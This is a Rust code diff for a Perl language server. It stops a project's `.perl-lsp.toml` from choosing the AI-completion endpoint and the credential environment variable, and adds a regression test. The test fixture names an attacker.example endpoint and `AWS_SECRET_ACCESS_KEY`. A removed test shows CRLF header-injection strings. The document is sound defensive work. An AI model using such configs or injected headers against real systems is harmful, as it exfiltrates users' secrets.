@@ -1149,6 +1149,22 @@ pub struct ProjectFeaturesConfig {
 }
 
 /// `[ai_completion]` section of `.perl-lsp.toml`.
+///
+/// Security: this struct intentionally does NOT carry `endpoint`,
+/// `api_key_env`, `api_key_header`, or `api_key_prefix`. Those four fields
+/// select a network destination and a process-environment credential; if a
+/// workspace-supplied `.perl-lsp.toml` could set them, a hostile cloned
+/// repository could name an arbitrary environment variable (e.g.
+/// `AWS_SECRET_ACCESS_KEY`) and have its value POSTed to an attacker-chosen
+/// endpoint on the first inline-completion request (issue #4955). See the
+/// analogous `perlPath`/`perlArgs` precedent below (issue #3729).
+///
+/// These four fields are accepted only through the LSP client/server
+/// configuration channel (`ServerConfig::update_from_value`'s `aiCompletion`
+/// block). **This slice does not establish the provenance or authority of that
+/// channel** — `update_from_value` knows only that it received an
+/// `aiCompletion` object, not whether it originated from machine, user,
+/// workspace, or folder settings. Hardening that is issue #4997.
 #[derive(Debug, Clone, Default, serde::Deserialize)]
 #[serde(default)]
 pub struct ProjectAiCompletionConfig {
@@ -1156,16 +1172,8 @@ pub struct ProjectAiCompletionConfig {
     pub enabled: Option<bool>,
     /// Provider type.
     pub provider: Option<String>,
-    /// API endpoint URL.
-    pub endpoint: Option<String>,
     /// Model identifier.
     pub model: Option<String>,
-    /// Environment variable name for API key.
-    pub api_key_env: Option<String>,
-    /// HTTP header used to send the API key.
-    pub api_key_header: Option<String>,
-    /// Optional auth scheme prepended before the API key.
-    pub api_key_prefix: Option<String>,
 }
 
 /// `[next_edit]` section of `.perl-lsp.toml`.
@@ -1447,25 +1455,16 @@ impl ProjectConfig {
         if let Some(ref provider) = self.ai_completion.provider {
             config.ai_completion.provider = provider.clone();
         }
-        if let Some(ref endpoint) = self.ai_completion.endpoint {
-            config.ai_completion.endpoint = endpoint.clone();
-        }
         if let Some(ref model) = self.ai_completion.model {
             config.ai_completion.model = model.clone();
         }
-        if let Some(ref key_env) = self.ai_completion.api_key_env {
-            config.ai_completion.api_key_env = key_env.clone();
-        }
-        if let Some(ref key_header) = self.ai_completion.api_key_header {
-            if let Some(header) = normalize_ai_api_key_header(key_header) {
-                config.ai_completion.api_key_header = header;
-            }
-        }
-        if let Some(ref key_prefix) = self.ai_completion.api_key_prefix {
-            if let Some(prefix) = normalize_ai_api_key_prefix(key_prefix) {
-                config.ai_completion.api_key_prefix = prefix;
-            }
-        }
+        // Security: do NOT honour workspace-supplied endpoint / api_key_env /
+        // api_key_header / api_key_prefix. Allowing a hostile project to pick
+        // both the destination and the process-environment credential name
+        // would let it exfiltrate an arbitrary named secret (issue #4955).
+        // These settings now arrive only via the LSP client/server
+        // configuration channel. That channel's own provenance is not
+        // established here - see issue #4997.
         if let Some(enabled) = self.next_edit.enabled {
             config.next_edit.enabled = enabled;
         }
@@ -1684,40 +1683,15 @@ pub fn merge_project_configs_for_server(
         |c| c.ai_completion.provider.clone(),
     );
     merge_opt_field(
-        &mut merged.ai_completion.endpoint,
-        &mut conflicts,
-        "ai_completion.endpoint",
-        folders,
-        |c| c.ai_completion.endpoint.clone(),
-    );
-    merge_opt_field(
         &mut merged.ai_completion.model,
         &mut conflicts,
         "ai_completion.model",
         folders,
         |c| c.ai_completion.model.clone(),
     );
-    merge_opt_field(
-        &mut merged.ai_completion.api_key_env,
-        &mut conflicts,
-        "ai_completion.api_key_env",
-        folders,
-        |c| c.ai_completion.api_key_env.clone(),
-    );
-    merge_opt_field(
-        &mut merged.ai_completion.api_key_header,
-        &mut conflicts,
-        "ai_completion.api_key_header",
-        folders,
-        |c| c.ai_completion.api_key_header.clone(),
-    );
-    merge_opt_field(
-        &mut merged.ai_completion.api_key_prefix,
-        &mut conflicts,
-        "ai_completion.api_key_prefix",
-        folders,
-        |c| c.ai_completion.api_key_prefix.clone(),
-    );
+    // Security: `endpoint` / `api_key_env` / `api_key_header` / `api_key_prefix`
+    // are intentionally absent from `ProjectAiCompletionConfig` (issue #4955)
+    // and therefore have nothing to merge here.
 
     // `[next_edit]`
     merge_opt_field(
@@ -3623,47 +3597,103 @@ profile = "recommended"
         assert_eq!(config.ai_completion.api_key_prefix, Some("Bearer".to_string()));
     }
 
-    /// `ProjectConfig::apply_to_server_config` must thread `api_key_header` and
-    /// `api_key_prefix` into `ServerConfig`. An empty `api_key_prefix` in the TOML
-    /// struct must clear the prefix to `None` (raw key path).
-    #[test]
-    fn project_config_applies_ai_auth_header_and_prefix() {
-        let mut config = ServerConfig::default();
-        let mut project = ProjectConfig::default();
-        project.ai_completion.api_key_header = Some("x-api-key".to_string());
-        project.ai_completion.api_key_prefix = Some(String::new()); // empty = clear prefix
+    // NOTE: `project_config_applies_ai_auth_header_and_prefix` and
+    // `project_config_ignores_malformed_ai_auth_header_settings` used to live
+    // here. They asserted that `ProjectConfig` (workspace-supplied
+    // `.perl-lsp.toml`) could set `api_key_header` / `api_key_prefix` and have
+    // it flow into `ServerConfig` — exactly the trust-boundary violation
+    // fixed for issue #4955. `ProjectAiCompletionConfig` no longer has those
+    // fields at all, so there is nothing left to thread through; the
+    // CRLF-injection normalization behaviour they also covered remains
+    // exercised for the (unaffected) user-settings path by
+    // `update_from_value_rejects_malformed_ai_auth_header_settings` above.
+    // See `workspace_ai_completion_ignores_untrusted_endpoint_and_credential_settings`
+    // below for the regression coverage that replaced them.
 
+    /// Security regression: a workspace-supplied `.perl-lsp.toml` must not be
+    /// able to redirect the AI-completion endpoint or select which process
+    /// environment variable is read as a credential (issue #4955). A hostile
+    /// cloned repository could otherwise name an arbitrary secret (e.g.
+    /// `AWS_SECRET_ACCESS_KEY`) and have its value POSTed to an
+    /// attacker-chosen endpoint on the first inline-completion request. Only
+    /// `enabled` / `provider` / `model` are workspace-settable; those do not
+    /// select a network destination or a credential.
+    #[test]
+    fn workspace_ai_completion_ignores_untrusted_endpoint_and_credential_settings() -> TestResult {
+        let temp = tempfile::tempdir()?;
+        std::fs::write(
+            temp.path().join(".perl-lsp.toml"),
+            r#"
+[ai_completion]
+enabled = true
+provider = "openai"
+model = "gpt-4"
+endpoint = "http://attacker.example/v1/chat/completions"
+api_key_env = "AWS_SECRET_ACCESS_KEY"
+api_key_header = "X-Attacker-Header"
+api_key_prefix = "Attacker "
+"#,
+        )?;
+        let project = load_project_config(temp.path())?.ok_or("expected parsed project config")?;
+
+        let default_config = ServerConfig::default();
+        let mut config = ServerConfig::default();
         project.apply_to_server_config(&mut config);
 
+        // The four credential/destination fields must be untouched by the
+        // workspace-supplied TOML — assert per-field, not in aggregate.
         assert_eq!(
-            config.ai_completion.api_key_header, "x-api-key",
-            "api_key_header must be applied from project config",
+            config.ai_completion.endpoint, default_config.ai_completion.endpoint,
+            "workspace-supplied endpoint must not change the effective config",
         );
         assert_eq!(
-            config.ai_completion.api_key_prefix, None,
-            "empty api_key_prefix in TOML must produce None (raw key)",
+            config.ai_completion.api_key_env, default_config.ai_completion.api_key_env,
+            "workspace-supplied api_key_env must not change the effective config",
+        );
+        assert_eq!(
+            config.ai_completion.api_key_header, default_config.ai_completion.api_key_header,
+            "workspace-supplied api_key_header must not change the effective config",
+        );
+        assert_eq!(
+            config.ai_completion.api_key_prefix, default_config.ai_completion.api_key_prefix,
+            "workspace-supplied api_key_prefix must not change the effective config",
         );
 
-        // Non-empty prefix round-trip.
-        let mut project2 = ProjectConfig::default();
-        project2.ai_completion.api_key_header = Some("Authorization".to_string());
-        project2.ai_completion.api_key_prefix = Some("Token".to_string());
-
-        project2.apply_to_server_config(&mut config);
-
-        assert_eq!(config.ai_completion.api_key_header, "Authorization");
-        assert_eq!(config.ai_completion.api_key_prefix, Some("Token".to_string()));
+        // Non-credential, non-destination fields remain workspace-settable.
+        assert!(config.ai_completion.enabled, "workspace-supplied enabled must still apply");
+        assert_eq!(
+            config.ai_completion.provider, "openai",
+            "workspace-supplied provider must still apply",
+        );
+        assert_eq!(
+            config.ai_completion.model, "gpt-4",
+            "workspace-supplied model must still apply",
+        );
+        Ok(())
     }
 
+    /// Companion to the regression above: the LSP client/server configuration
+    /// channel (the `aiCompletion` block of `ServerConfig::update_from_value`)
+    /// can still set all four fields. This proves the fix closes the
+    /// `.perl-lsp.toml` route rather than disabling the feature.
+    ///
+    /// It asserts nothing about that channel's authority. `update_from_value`
+    /// cannot tell machine, user, workspace, or folder settings apart; issue
+    /// #4997 covers establishing that.
     #[test]
-    fn project_config_ignores_malformed_ai_auth_header_settings() {
+    fn client_configuration_can_still_set_ai_endpoint_and_credential_fields() {
         let mut config = ServerConfig::default();
-        let mut project = ProjectConfig::default();
-        project.ai_completion.api_key_header = Some("x-api-key\r\nX-Injected".to_string());
-        project.ai_completion.api_key_prefix = Some("Token\r\nX-Injected".to_string());
+        config.update_from_value(&serde_json::json!({
+            "aiCompletion": {
+                "endpoint": "https://api.openai.com/v1/chat/completions",
+                "apiKeyEnv": "OPENAI_API_KEY",
+                "apiKeyHeader": "Authorization",
+                "apiKeyPrefix": "Bearer"
+            }
+        }));
 
-        project.apply_to_server_config(&mut config);
-
+        assert_eq!(config.ai_completion.endpoint, "https://api.openai.com/v1/chat/completions");
+        assert_eq!(config.ai_completion.api_key_env, "OPENAI_API_KEY");
         assert_eq!(config.ai_completion.api_key_header, "Authorization");
         assert_eq!(config.ai_completion.api_key_prefix, Some("Bearer".to_string()));
     }
